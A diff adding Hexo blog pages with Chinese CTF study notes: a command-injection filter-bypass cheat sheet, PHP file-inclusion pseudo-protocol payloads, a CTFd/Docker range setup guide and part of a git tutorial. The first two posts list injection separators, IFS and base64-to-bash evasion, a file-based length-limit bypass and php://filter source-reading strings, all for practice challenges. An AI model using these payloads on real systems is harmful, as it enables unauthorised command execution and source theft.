@@ -145,6 +145,618 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/" class="post-title-link" itemprop="url">命令执行绕过</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-03-02 01:23:40 / 修改时间：01:25:50" itemprop="dateCreated datePublished" datetime="2022-03-02T01:23:40+08:00">2022-03-02</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="命令执行绕过小技巧"><a href="#命令执行绕过小技巧" class="headerlink" title="命令执行绕过小技巧"></a>命令执行绕过小技巧</h1><h1 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h1><h3 id="windows-下"><a href="#windows-下" class="headerlink" title="windows 下"></a>windows 下</h3><blockquote>
+<p><code>|</code>直接执行后面的语句<br><code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br><code>&amp;</code>前面和后面命令都要执行，无论前面真假<br><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
+</blockquote>
+<h3 id="Linux-下"><a href="#Linux-下" class="headerlink" title="Linux 下"></a>Linux 下</h3><blockquote>
+<p><code>;</code>前面和后面命令都要执行，无论前面真假<br><code>|</code>直接执行后面的语句<br><code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br><code>&amp;</code>前面和后面命令都要执行，无论前面真假<br><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
+<p><strong>“;”分号用法</strong></p>
+<p>方式：command1 ; command2</p>
+<p>用;号隔开每个命令, 每个命令按照从左到右的顺序,顺序执行， 彼此之间不关心是否失败， 所有命令都会执行。</p>
+</blockquote>
+<hr>
+<h1 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h1><blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;` `&lt;` `&lt;&gt;` 重定向符</span><br><span class="line">`%09`(需要php环境)</span><br><span class="line">`$&#123;IFS&#125;`</span><br><span class="line">`$IFS$9`</span><br><span class="line">`&#123;cat,flag.php&#125;` //用逗号实现了空格功能</span><br><span class="line">`%20`</span><br><span class="line">`%09</span><br><span class="line"></span><br><span class="line">cat flag.txt</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+</blockquote>
+<hr>
+<h1 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h1><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><p>拼接</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=fl;d=ag;$a$b $c$d</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>base64编码</p>
+<blockquote>
+<p><code>echo &quot;Y2F0IGZsYWc=&quot;|base64 -d</code><br><code>echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash</code> (在bash被过滤的情况下可尝试sh)</p>
+</blockquote>
+<p>单引号、双引号</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>反斜线</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>正则 (假设/bin/cat: test: 是一个目录)</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;`</span><br><span class="line">`/???/?at ????`</span><br><span class="line">`/???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>$1、$2等和$@</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span><span class="comment"># 是传给脚本的参数个数</span></span><br><span class="line"><span class="variable">$0</span> 是脚本本身的名字</span><br><span class="line"><span class="variable">$1</span> 是传递给该shell脚本的第一个参数</span><br><span class="line"><span class="variable">$2</span> 是传递给该shell脚本的第二个参数</span><br><span class="line"><span class="variable">$</span><span class="selector-tag">@</span> 是传给脚本的所有参数的列表</span><br><span class="line"><span class="variable">$</span>* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过<span class="number">9</span>个</span><br><span class="line"><span class="variable">$</span><span class="variable">$</span> 是脚本运行的当前进程ID号</span><br><span class="line"><span class="variable">$</span>? 是显示最后命令的退出状态，<span class="number">0</span>表示没有错误，其他表示有错误</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h1><blockquote>
+<p>more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容<br>grep<br>1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：<br>grep test *file<br>strings</p>
+</blockquote>
+<img src="/2022/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/1999159-20200719165203379-693026533.png" class="" title="img">
+
+<img src="/2022/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/1999159-20200719165210223-677342141.png" class="" title="img">
+
+<p>做到的一道题目，在这里记录一下</p>
+<hr>
+<h1 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h1><blockquote>
+<p>cat$IFS$9<code>ls</code></p>
+<p>cat$IFS$9$(ls)</p>
+</blockquote>
+<p>(内联，就是将``或$()内命令的输出作为输入执行)</p>
+<hr>
+<h2 id="利用ls-t和-gt-以及换行符绕过长度限制执行命令-文件构造绕过"><a href="#利用ls-t和-gt-以及换行符绕过长度限制执行命令-文件构造绕过" class="headerlink" title="利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)"></a>利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/</span>桌面<span class="comment"># echo &quot;flag&#123;hahaha&#125;&quot; &gt; flag.txt</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/</span>桌面<span class="comment"># touch &quot;ag&quot;</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/</span>桌面<span class="comment"># touch &quot;fl\\&quot;</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/</span>桌面<span class="comment"># touch &quot;t \\&quot;</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/</span>桌面<span class="comment"># touch &quot;ca\\&quot;</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/</span>桌面<span class="comment"># ls -t</span></span><br><span class="line"><span class="string">&#x27;ca\&#x27;  &#x27;</span>t \<span class="string">&#x27;  &#x27;</span>fl\<span class="string">&#x27;   ag   flag</span></span><br><span class="line"><span class="string">root@kali:~/桌面# ls -t &gt;a     #将 ls -t 内容写入到a文件中</span></span><br><span class="line"><span class="string">root@kali:~/桌面# sh a</span></span><br><span class="line"><span class="string">a: 1: a: not found</span></span><br><span class="line"><span class="string">flag&#123;hahaha&#125;</span></span><br><span class="line"><span class="string">a: 6: flag.txt: not found</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>\</code>是指换行<br><code>ls -t</code>将文件按时间排序输出<br><code>sh</code>命令可以从一个文件中读取命令</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/02/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/02/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">伪协议学习</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-03-02 01:07:36 / 修改时间：01:21:20" itemprop="dateCreated datePublished" datetime="2022-03-02T01:07:36+08:00">2022-03-02</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="伪协议学习"><a href="#伪协议学习" class="headerlink" title="伪协议学习"></a>伪协议学习</h1><h1 id="伪协议的学习"><a href="#伪协议的学习" class="headerlink" title="伪协议的学习"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-an-/p/12372220.html">伪协议的学习</a></h1><p>伪协议常常用于文件包含漏洞之中。</p>
+<p>在php中能够造成文件包含的函数有include、require、include_once、require_once、highlight_file、show_source、file_get_contents、fopen、file、readfile</p>
+<h2 id="0x01-函数"><a href="#0x01-函数" class="headerlink" title="0x01 函数"></a><strong>0x01 函数</strong></h2><h3 id="1-include函数"><a href="#1-include函数" class="headerlink" title="1.include函数"></a><strong>1.include函数</strong></h3><p>可以放在PHP脚本的任意位置，一般放在流程控制的处理部分中。当PHP脚本执行到include指定引入的文件时，才将它包含并尝试执行。这种方式可以把程序执行时的流程进行简单化。当第二次遇到相同文件时，PHP还是会重新解释一次，include相对于require的执行效率下降很多，同时在引入文件中包含用户自定义函数时，PHP在解释过程中会发生函数重复定义问题。include载入成功后，返回1，失败则返回false。</p>
+<h3 id="2-require函数"><a href="#2-require函数" class="headerlink" title="2.require函数"></a><strong>2.require函数</strong></h3><p>require函数一般放在PHP脚本的最前面，PHP执行前就会先读入require指定引入的文件，包含并尝试执行引入的脚本文件。require的工作方式是提高PHP的执行效率，当它在同一个网页中解释过一次后，第二次便不会解释。但同样的，正因为它不会重复解释引入文件，所以当PHP中使用循环或条件语句来引入文件时，需要用到include。require载入成功返回1，失败无返回值。</p>
+<h3 id="3-include-once和require-once函数"><a href="#3-include-once和require-once函数" class="headerlink" title="3.include_once和require_once函数"></a><strong>3.include_once和require_once函数</strong></h3><p>分别与require / include作用相同，不同的是他们在执行到时会先检查目标内容是不是在之前已经导入过，如果导入过了，那么便不会再次重复引入其同样的内容。</p>
+<h3 id="4-highlight-file函数"><a href="#4-highlight-file函数" class="headerlink" title="4.highlight_file函数"></a><strong>4.highlight_file函数</strong></h3><p>highlight_file() 函数对文件进行语法高亮显示。</p>
+<p>语法：highlight_file(filename,return) —— filename：必需。要进行高亮处理的 PHP 文件的路径。return：可选。如果设置 true，则本函数返回高亮处理的代码。</p>
+<p>该函数通过使用 PHP 语法高亮程序中定义的颜色，输出或返回包含在 filename 中的代码的语法高亮版本。如果 return 参数被设置为 true，那么该函数会返回被高亮处理的代码，而不是输出它们。否则，若成功，则返回 true，失败则返回 false。许多服务器被配置为对带有 phps 后缀的文件进行自动高亮处理。例如，在查看 example.phps 时，将显示该文件被语法高亮显示的源代码。要启用该功能，请把AddType application/x-httpd-php-source .phps添加到 httpd.conf。</p>
+<h3 id="5-show-source函数"><a href="#5-show-source函数" class="headerlink" title="5.show_source函数"></a><strong>5.show_source函数</strong></h3><p>该函数是highlight_file函数的别名。</p>
+<h3 id="6-file-get-contents函数"><a href="#6-file-get-contents函数" class="headerlink" title="6.file_get_contents函数"></a><strong>6.file_get_contents函数</strong></h3><p>file_get_contents() 函数把整个文件读入一个字符串中。和 file() 一样，不同的是 file_get_contents() 把文件读入一个字符串。file_get_contents() 函数是用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。</p>
+<img src="/2022/03/02/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/1884723-20200227145402957-11433424.png" class="" title="img">
+
+<h3 id="7-file函数"><a href="#7-file函数" class="headerlink" title="7.file函数"></a><strong>7.file函数</strong></h3><p>file() 函数把整个文件读入一个数组中。与 file_get_contents() 类似，不同的是 file() 将文件作为一个数组返回。数组中的每个单元都是文件中相应的一行，包括换行符在内。如果失败，则返回 false。</p>
+<img src="/2022/03/02/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/1884723-20200227145546672-1410880982.png" class="" title="img">
+
+<h3 id="8-fopen函数"><a href="#8-fopen函数" class="headerlink" title="8.fopen函数"></a><strong>8.<a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-filesystem-fopen.html">fopen函数</a></strong></h3><h3 id="9-readfile函数"><a href="#9-readfile函数" class="headerlink" title="9.readfile函数"></a><strong>9.<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_filesystem_readfile.asp">readfile函数</a></strong></h3><h2 id="0x02-伪协议"><a href="#0x02-伪协议" class="headerlink" title="0x02 伪协议"></a><strong>0x02 伪协议</strong></h2><h3 id="1-php伪协议："><a href="#1-php伪协议：" class="headerlink" title="1.php伪协议："></a><strong>1.php伪协议：</strong></h3><p>需要开启allow_url_fopen的：php://input、php://stdin、php://memory和php://temp</p>
+<p>不需要开启allow_wrl_fopen的：php://filter</p>
+<p>在CTF中经常使用的是php://filter和php://input</p>
+<p><strong>php://filter用于读取源码，php://input用于执行php代码</strong></p>
+<p>==<strong>php://input需要post请求提交数据</strong>==</p>
+<p><strong>php://filter可以get提交?a=php://filter/read=convert.base64-encode/resource=xxx.php ==</strong></p>
+<h3 id="2-data协议"><a href="#2-data协议" class="headerlink" title="2.data协议"></a><strong>2.data协议</strong></h3><p>php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码</p>
+<p>使用方法:data://text/plain;base64,xxxx(base64编码后的数据)</p>
+<p>data伪协议只有在php&lt;5.3且include=on时可以写木马。</p>
+<h3 id="3-file协议"><a href="#3-file协议" class="headerlink" title="3.file协议"></a><strong>3.file协议</strong></h3><p>file://用于访问本地文件系统</p>
+<p>用法：file:// [文件的绝对路径和文件名]</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/02/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/02/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/" class="post-title-link" itemprop="url">靶场搭建</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-03-02 01:03:19 / 修改时间：01:06:03" itemprop="dateCreated datePublished" datetime="2022-03-02T01:03:19+08:00">2022-03-02</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <pre><code>                                    #  靶场搭建
+</code></pre>
+<h2 id="1、初始化环境："><a href="#1、初始化环境：" class="headerlink" title="1、初始化环境："></a>1、初始化环境：</h2><p>由于是刚打开云服务器（腾讯云，ubuntu20.03）</p>
+<p>所以首先</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctrl +alt +t  进入到控制台</span><br><span class="line">sudo passwd root  设置密码</span><br></pre></td></tr></table></figure>
+
+<p>初始化docker</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd  /root</span><br><span class="line">vi init.sh</span><br></pre></td></tr></table></figure>
+
+<p>在 init.sh编写（.sh文件是脚本文件）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">#更新系统</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line"></span><br><span class="line">#安装 docker和docker-compose</span><br><span class="line">sudo apt install docker docker-compose zip</span><br><span class="line"></span><br><span class="line">#设置镜像加速器    这里我没有买只能用别人的  也可以不用</span><br><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://faalpdo3.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
+
+<p>然后 增加权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod + x init.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2、搭建ctfd"><a href="#2、搭建ctfd" class="headerlink" title="2、搭建ctfd"></a>2、搭建ctfd</h2><h3 id="1、-开放端口"><a href="#1、-开放端口" class="headerlink" title="1、 开放端口"></a>1、 开放端口</h3><p> 在服务器面板里开放端口</p>
+<img src="/2022/03/02/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/image-20220224151017125.png" class="" title="image-20220224151017125">
+
+<h3 id="2、拉取镜像"><a href="#2、拉取镜像" class="headerlink" title="2、拉取镜像"></a>2、拉取镜像</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 8000:8000 -d ctfd/ctfd</span><br><span class="line">这里没有镜像他会去拉取</span><br></pre></td></tr></table></figure>
+
+<p>然后去访问URL+开放的端口</p>
+<p>==这里注意如果是云服务器应该用公网ip，虚拟机直接用ifconfig查看==</p>
+<p>进入初始化界面后设置账号密码就可以了</p>
+<h3 id="3-进入到docker中"><a href="#3-进入到docker中" class="headerlink" title="3.进入到docker中"></a>3.进入到docker中</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps  查看id</span><br><span class="line">docker exec -it id /bin/bash</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4汉化ctfd"><a href="#4汉化ctfd" class="headerlink" title="4汉化ctfd"></a>4汉化ctfd</h3><p>下载汉化包</p>
+<p><strong>首先应该去到要下载的目录在执行命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Guf/CTFd_chinese_CN.git</span><br><span class="line"></span><br><span class="line">切换到CTFd目录 删除主题</span><br><span class="line">rm -rf themes   文件夹删除命令</span><br><span class="line">然后把下载好的主题以及对应的版本cp过来，要下载刚才themes那个文件夹里面</span><br><span class="line">cp -r /opt/CTFd/CTFd_chinese_CN/V3.1.1/CTFd-3.1.1/CTFd/themes /opt/CTFd      应该是这个忘记截图了</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="三、出题"><a href="#三、出题" class="headerlink" title="三、出题"></a>三、出题</h2><h3 id="1、编写dockerfile"><a href="#1、编写dockerfile" class="headerlink" title="1、编写dockerfile"></a>1、编写dockerfile</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我是在root目录下创建文件夹里面创建dockerfile</span><br><span class="line">mkdir text</span><br><span class="line">cd text</span><br><span class="line">touch Dockerfile</span><br><span class="line">vim Dockerfile</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">复制这段  适当改一下</span><br><span class="line">FROM sakadonohito/php5.6.23-apache</span><br><span class="line"></span><br><span class="line">LABEL Author=&quot;space&quot;</span><br><span class="line"></span><br><span class="line">COPY ./src/ /var/www/html/</span><br><span class="line"></span><br><span class="line">RUN chmod -R 755 /var/www/html/ &amp;&amp; \</span><br><span class="line">    chown -R root:root /var/www/html </span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br><span class="line">CMD sh -c &quot;apache2-foreground&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="2、创建src目录"><a href="#2、创建src目录" class="headerlink" title="2、创建src目录"></a>2、创建src目录</h3><p>要在dockerfile文件所在的目录下创建</p>
+<img src="/2022/03/02/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/image-20220302010001325.png" class="" title="image-20220302010001325">
+
+<h3 id="3-运行docker"><a href="#3-运行docker" class="headerlink" title="3.运行docker"></a>3.运行docker</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -t trick:v3 .   // .的意思是把当前目录下的文件都给打包</span><br><span class="line">这里容器名称为 trick 版本为v3</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 7000:80 -d trick:v3</span><br><span class="line">运行这个容器</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/02/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/image-20220302005906224.png" class="" title="image-20220302005906224">
+
+
+
+
+
+<img src="/2022/03/02/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/image-20220302010146552.png" class="" title="image-20220302010146552">
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/25/git%E5%AD%A6%E4%B9%A01/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/25/git%E5%AD%A6%E4%B9%A01/" class="post-title-link" itemprop="url">git学习1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-25 22:46:41" itemprop="dateCreated datePublished" datetime="2022-02-25T22:46:41+08:00">2022-02-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-26 11:32:06" itemprop="dateModified" datetime="2022-02-26T11:32:06+08:00">2022-02-26</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="git学习"><a href="#git学习" class="headerlink" title="git学习"></a>git学习</h1><h2 id="一、git的概述"><a href="#一、git的概述" class="headerlink" title="一、git的概述"></a>一、git的概述</h2><h3 id="1、-版本控制的两种方式"><a href="#1、-版本控制的两种方式" class="headerlink" title="1、 版本控制的两种方式"></a>1、 版本控制的两种方式</h3><p>1、集中式版本控制：</p>
+<p>集中化的版本控制系统诸如 CVS、 SVN 等，都有一个单一的集中管理的服务器，保存所有文件的修订版本，而协同工作的人们都通过客户端连到这台服务器，取出最新的文件或者提交更新（==简单来说就是类似实时共享文件，所有人都在集中管理的服务器里修改文件==）</p>
+<p>2、分布式版本控制工具</p>
+<p>像 Git 这种分布式版本控制工具，客户端提取的不是最新版本的文件快照，而是把代码仓库完整地镜像下来（本地库）。==（也就是说每台电脑都等价于远程库，即使远程库宕机了，其他人也可以继续工作，等远程库好了，在提交新文件）==</p>
+<h3 id="2、工作机制"><a href="#2、工作机制" class="headerlink" title="2、工作机制"></a>2、工作机制</h3><img src="/2022/02/25/git%E5%AD%A6%E4%B9%A01/image-20220225193020396.png" class="" title="image-20220225193020396">
+
+
+
